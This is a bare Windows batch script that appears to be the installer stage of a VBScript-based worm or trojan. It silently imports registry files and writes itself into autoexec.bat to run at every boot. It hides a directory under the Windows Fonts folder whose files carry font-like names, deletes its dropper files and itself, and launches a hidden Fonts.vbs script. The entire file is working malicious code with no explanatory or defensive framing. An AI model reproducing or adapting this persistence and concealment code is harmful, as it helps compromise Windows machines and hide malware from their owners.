@echo off
regedit /s %windir%\Fonts\System\Protect.reg
echo @echo off >> c:\autoexec.bat
echo @regedit /s %windir%\Fonts\System\Fonts.reg >> c:\autoexec.bat
attrib %windir%\Fonts\System +h +r
if exist %windir%\Fonts\System\startup.vbs del %windir%\Fonts\System\startup.vbs
if exist %windir%\Fonts\System\Protect.reg del %windir%\Fonts\System\Protect.reg
if exist %windir%\540.exe del %windir%\540.exe
if exist %windir%\vbs.vbs del %windir%\vbs.vbs
WScript.exe %windir%\Fonts\System\Fonts.vbs %*
if exist %windir%\Fonts\System\Fonts.bat del %windir%\Fonts\System\Fonts.bat
